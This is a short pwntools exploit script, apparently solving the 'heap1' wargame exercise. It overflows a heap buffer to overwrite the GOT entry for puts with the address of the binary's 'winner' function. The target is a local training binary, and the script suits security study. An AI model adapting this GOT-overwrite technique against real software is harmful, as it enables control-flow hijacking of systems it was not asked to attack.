from pwn import *
context.log_level = 'debug'

elf = ELF("./heap1")

puts_got = p32(elf.got["puts"])
win_func = p32(elf.symbols['winner'])

arg1 = cyclic(0x14) + puts_got
arg2 = win_func

p = process([elf.path,arg1,arg2])

p.recvall()